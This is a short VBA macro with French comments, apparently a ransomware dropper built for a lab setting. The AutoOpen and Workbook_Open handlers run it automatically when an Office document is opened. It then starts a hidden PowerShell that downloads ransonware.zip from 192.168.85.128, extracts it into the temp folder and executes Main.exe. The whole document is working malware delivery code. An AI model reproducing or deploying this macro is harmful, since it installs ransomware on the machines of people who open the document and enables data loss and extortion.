Sub macro_powershell()

    'Crée un Shell appelant des commandes powershell
    Dim powershellCommands
    powershellCommands = Shell("powershell Invoke-WebRequest -Uri http://192.168.85.128/ransonware.zip -OutFile $Env:temp\ransonware.zip ; Expand-Archive $Env:temp\ransonware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransonware\ ; .\Main.exe ; exit", 0)

End Sub

'Ajoute la compatibilité PowerPoint et Excel,
'En utilisant les fonctions AutoOpen() et Workbook_Open()

Sub AutoOpen()
    macro_powershell
End Sub

Sub Workbook_Open()
    macro_powershell
End Sub
